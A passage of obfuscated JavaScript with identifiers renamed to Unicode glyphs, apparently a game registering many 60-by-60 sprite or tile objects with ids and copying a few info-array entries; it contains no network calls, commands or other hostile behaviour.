			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⲆᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⲆᐃΔ].id = ᐃᐃ.ᐃΔⲆᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆΔⲆⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔᐃⲆⵠ].id = ᐃᐃ.ⲆΔᐃⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃΔᐃ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⵠΔⲆ].id = ᐃᐃ.ΔᐃⵠΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆⵠⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔᐃΔ], ⵠᐃⵠⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆⵠⲆⵠ].id = ᐃᐃ.ᐃⲆⵠⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠⲆΔ], ᐃᐃⵠⲆᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆⲆⲆ].id = ᐃᐃ.ΔⵠⲆⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⲆⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃΔⵠ], ⵠᐃⵠⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⲆⵠⵠ].id = ᐃᐃ.ⲆΔⲆⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠΔⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃᐃⵠⵠΔᐃ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠΔⵠΔ].id = ᐃᐃ.ᐃⵠΔⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃᐃΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠⲆ], ⵠᐃⵠⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃᐃΔⵠ].id = ᐃᐃ.ⵠᐃᐃΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠⲆⵠ], ᐃᐃⲆⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠᐃⲆ].id = ᐃᐃ.ⲆᐃⵠᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆᐃᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆΔⲆⵠΔⲆ], ⲆⲆΔⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆᐃᐃΔ].id = ᐃᐃ.ⲆⲆᐃᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆⲆᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⵠΔⲆ].id = ᐃᐃ.ᐃⵠⵠΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⵠΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔΔᐃⵠᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⵠΔᐃ].id = ᐃᐃ.ⲆⵠⵠΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔΔⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠⵠⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔΔⵠⵠ].id = ᐃᐃ.ⵠΔΔⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠⲆᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⲆΔᐃ].id = ᐃᐃ.ⲆⵠⲆΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃᐃⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⵠⲆᐃⲆᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃᐃⵠΔ].id = ᐃᐃ.ᐃᐃᐃⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⲆⵠΔⲆᐃ], ᐃᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⵠᐃ].id = ᐃᐃ.ᐃᐃΔⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⲆⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔΔⵠⲆⲆᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⲆⵠⵠ].id = ᐃᐃ.ᐃⵠⲆⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃⲆᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠⵠΔ].id = ᐃᐃ.ⲆᐃⵠⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔΔⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.Δᐃᐃⵠᐃᐃᐃ], ⲆⲆΔⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔΔⵠⵠ].id = ᐃᐃ.ⲆΔΔⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⲆΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⲆΔΔ].id = ᐃᐃ.ⵠΔⲆΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃⵠᐃ].id = ᐃᐃ.ⵠⲆᐃⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⵠⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⲆⲆΔΔⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⵠⵠⲆ].id = ᐃᐃ.ΔΔⵠⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆᐃⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃΔᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆᐃⵠⲆ].id = ᐃᐃ.ΔⲆᐃⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⵠⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆΔⲆᐃΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⵠⲆΔ].id = ᐃᐃ.ᐃⵠⵠⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔΔᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠᐃᐃⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔΔᐃⲆ].id = ᐃᐃ.ⵠΔΔᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⵠⵠⲆᐃᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⲆⵠΔ].id = ᐃᐃ.ⲆⵠⲆⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⲆⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⵠⵠⲆ], ⵠⵠⵠᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⲆⲆⲆ].id = ᐃᐃ.ᐃΔⲆⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⵠⲆⲆⵠⵠ], ᐃᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⲆⵠⲆ].id = ᐃᐃ.ⵠⵠⲆⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆΔᐃⵠᐃΔ], ΔΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⵠΔⲆ].id = ᐃᐃ.ⵠΔⵠΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⵠΔⲆ].info.ᐃⵠ[ⵠⵠⵠΔ] = this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⵠΔⲆ].info.ᐃⵠ[Δᐃᐃᐃ];
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆⲆⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃᐃⵠ].id = ᐃᐃ.ⵠᐃᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔⲆΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆ].id = ᐃᐃ.ⲆⵠΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠᐃᐃⲆᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠᐃⲆⲆ].id = ᐃᐃ.ⵠⵠᐃⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⲆⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆⵠΔⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⲆⲆΔ].id = ᐃᐃ.ⲆᐃⲆⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⵠΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⵠⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⵠΔᐃ].id = ᐃᐃ.ⵠⲆⵠΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆⲆⵠ], ⵠⵠⵠⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃΔⲆ].id = ᐃᐃ.ⵠⲆᐃΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆΔᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔⲆⵠΔΔ], ΔΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆΔᐃΔ].id = ᐃᐃ.ⲆⲆΔᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⲆᐃΔΔⵠ], ΔⲆΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆΔⲆ].id = ᐃᐃ.ΔⵠⲆΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃΔΔⵠⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠΔⲆ].id = ᐃᐃ.ⲆᐃⵠΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⵠᐃᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃᐃⲆⵠ].id = ᐃᐃ.ᐃᐃᐃⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⵠⲆⵠ].id = ᐃᐃ.ⲆⵠⵠⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔⲆΔ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔⵠΔ].id = ᐃᐃ.ΔΔΔⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔᐃΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆᐃᐃⲆΔⵠ], ΔΔᐃΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔᐃΔⵠ].id = ᐃᐃ.ᐃΔᐃΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠⵠⵠΔⲆ], ᐃᐃⲆⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠⵠᐃ].id = ᐃᐃ.ΔⲆⵠⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⲆⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠᐃᐃᐃᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⲆⲆⲆ].id = ᐃᐃ.ⲆⲆⲆⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆΔⵠᐃⲆⵠ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔᐃⲆ].id = ᐃᐃ.ⲆⵠΔᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠΔⲆᐃⵠΔ], ᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆΔⲆⲆ].id = ᐃᐃ.ᐃⲆΔⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆΔⲆⲆ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆΔⲆⲆ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠᐃⵠ], ᐃᐃⲆⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃΔΔ].id = ᐃᐃ.ⵠⲆᐃΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃΔΔ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃΔΔ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆΔΔΔΔⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔΔᐃ].id = ᐃᐃ.ΔΔΔΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔΔᐃ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔΔᐃ].info.ᐃⵠ[ΔⲆⲆ];
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⲆΔⲆᐃΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔⵠᐃ].id = ᐃᐃ.ΔΔΔⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔⵠᐃ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔⵠᐃ].info.ᐃⵠ[ΔⲆⲆ];
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⲆⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆᐃⲆⲆⲆⲆ], ᐃᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⲆⲆᐃ].id = ᐃᐃ.ⵠΔⲆⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⵠΔⵠᐃᐃ], ⵠⵠⵠⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠΔΔ].id = ᐃᐃ.ⲆᐃⵠΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃΔⵠΔⲆⵠ], ᐃⲆᐃᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠᐃⲆⵠ].id = ᐃᐃ.ⵠⵠᐃⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠΔⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃⲆⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠΔⵠΔ].id = ᐃᐃ.ΔⵠΔⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔᐃⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⵠΔⵠⲆⵠ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔᐃⲆᐃ].id = ᐃᐃ.ⲆΔᐃⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆᐃᐃⵠⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆΔ].id = ᐃᐃ.ⲆⵠΔⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠⵠᐃⲆᐃ], ᐃᐃⵠⲆᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⵠⵠᐃ].id = ᐃᐃ.ᐃⵠⵠⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃΔᐃⵠᐃⵠ], ⵠᐃⵠⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆΔⲆᐃ].id = ᐃᐃ.ΔⲆΔⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃⵠⲆⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔΔⵠ].id = ᐃᐃ.ⲆⵠΔΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔΔⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃᐃⲆΔΔΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔΔⲆⵠ].id = ᐃᐃ.ⵠΔΔⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔⲆⵠᐃⲆⲆ], ⵠΔΔΔΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔΔⵠ].id = ᐃᐃ.ᐃᐃΔΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆΔΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆΔᐃ].id = ᐃᐃ.ΔᐃⲆΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔᐃⲆΔⵠᐃ], ΔⲆᐃⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆⲆ].id = ᐃᐃ.ⲆⵠΔⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⲆΔΔ], ΔΔᐃΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠⵠⲆ].id = ᐃᐃ.ⲆᐃⵠⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃᐃΔ].id = ᐃᐃ.ᐃⵠᐃᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃᐃ], ⲆΔⵠⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃⲆᐃ].id = ᐃᐃ.ⵠⲆᐃⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠᐃⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⵠΔᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠᐃⵠⲆ].id = ᐃᐃ.ⲆⵠᐃⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⵠᐃᐃΔⵠ], ᐃᐃⵠⲆᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⵠΔⲆ].id = ᐃᐃ.ΔⵠⵠΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⲆⲆᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔⲆⲆ].id = ᐃᐃ.ΔΔΔⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃⲆΔᐃⵠ], ΔⲆᐃⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆΔⵠ].id = ᐃᐃ.ΔⲆⲆΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆΔⵠ].info.ᐃⵠ[ⵠΔⲆᐃ] = this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆΔⵠ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆᐃᐃᐃΔ], ΔⲆᐃⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃᐃᐃ].id = ᐃᐃ.ⵠⲆᐃᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃⲆⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⵠᐃᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃⲆⲆᐃ].id = ᐃᐃ.ᐃᐃⲆⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⵠΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠⵠ], ΔᐃⲆΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⵠΔᐃ].id = ᐃᐃ.ΔⵠⵠΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⲆⵠΔ].id = ᐃᐃ.ΔΔⲆⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃΔΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆⲆᐃᐃΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃΔΔᐃ].id = ᐃᐃ.ⵠᐃΔΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃᐃⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⵠⲆⲆⲆΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃᐃⲆΔ].id = ᐃᐃ.ⵠᐃᐃⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔᐃⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔⲆΔ], ᐃᐃⲆⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔᐃⲆΔ].id = ᐃᐃ.ΔΔᐃⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆᐃⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔⵠⲆⲆΔΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆᐃⲆᐃ].id = ᐃᐃ.ᐃⲆᐃⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆᐃⲆᐃ].info.ᐃⵠ[ᐃⵠⲆⲆⲆ] = this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆᐃⲆᐃ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆᐃⵠ].id = ᐃᐃ.ⵠᐃⲆᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔᐃΔⵠᐃⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆⵠᐃ].id = ᐃᐃ.ⵠᐃⲆⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆⵠᐃ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆⵠᐃ].info.ᐃⵠ[Ⲇᐃᐃᐃ];
